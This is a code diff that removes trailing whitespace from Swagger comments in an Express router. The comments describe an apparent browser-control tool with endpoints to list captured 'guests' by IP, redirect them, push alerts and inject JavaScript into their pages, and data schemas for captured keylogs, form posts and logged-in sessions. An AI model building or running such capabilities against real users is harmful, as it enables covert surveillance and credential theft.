@@ -8,7 +8,7 @@ const router = Router()
 
 /**
  * @swagger
- * 
+ *
  * /guests:
  *  get:
  *    description: Returns an array of captured Guests
@@ -47,7 +47,7 @@ router.use('/guests/:ip', async (req, res, next) => {
 
 /**
  * @swagger
- * 
+ *
  * /guests/{ip}:
  *  get:
  *    description: Returns a Guest with specific IP
@@ -76,7 +76,7 @@ router.get('/guests/:ip', async (req, res) => {
 
 /**
  * @swagger
- * 
+ *
  * /guests/{ip}/alert/{message}:
  *  get:
  *    description: Send an alert notification to a specific guest
@@ -113,7 +113,7 @@ router.get('/guests/:ip/alert/:message', async (req, res) => {
 
 /**
  * @swagger
- * 
+ *
  * /guests/{ip}/redirect/{url}:
  *  get:
  *    description: Redirect a specific guest to a given URL
@@ -150,7 +150,7 @@ router.get('/guests/:ip/redirect/:url', async (req, res) => {
 
 /**
  * @swagger
- * 
+ *
  * /guests/{ip}/say/{message}:
  *  get:
  *    description: Send a text-to-speech (TTS) notification to a specific guest
@@ -187,7 +187,7 @@ router.get('/guests/:ip/say/:message', async (req, res) => {
 
 /**
  * @swagger
- * 
+ *
  * /guests/{ip}/inject:
  *  post:
  *    description: Inject a JavaScript code into a specific guest's web page
@@ -230,9 +230,9 @@ router.post('/guests/:ip/inject', async (req, res) => {
 
 /**
  * @swagger
- * 
+ *
  * definitions:
- * 
+ *
  *  Guest:
  *    type: object
  *    properties:
@@ -344,20 +344,20 @@ router.post('/guests/:ip/inject', async (req, res) => {
  *      networkSpeed:
  *        description: guest's detected internet speed
  *        $ref: '#/definitions/NetworkSpeed'
- * 
+ *
  *  Post:
  *    type: object
  *    properties:
  *      path:
  *        type: string
  *        description: URL link of the performed request
- *      date: 
+ *      date:
  *        type: string
  *        description: timestamp of the time request was performed
  *      data:
  *        type: object
  *        description: data that were sent in the request
- * 
+ *
  *  KeyLog:
  *    type: object
  *    properties:
@@ -370,7 +370,7 @@ router.post('/guests/:ip/inject', async (req, res) => {
  *      log:
  *        type: string
  *        description: captured key log content
- * 
+ *
  *  Sessions:
  *    type: object
  *    properties:
@@ -390,7 +390,7 @@ router.post('/guests/:ip/inject', async (req, res) => {
  *        type: boolean
  *      airbnb:
  *        type: boolean
- * 
+ *
  *  NetworkSpeed:
  *    type: object
  *    properties:
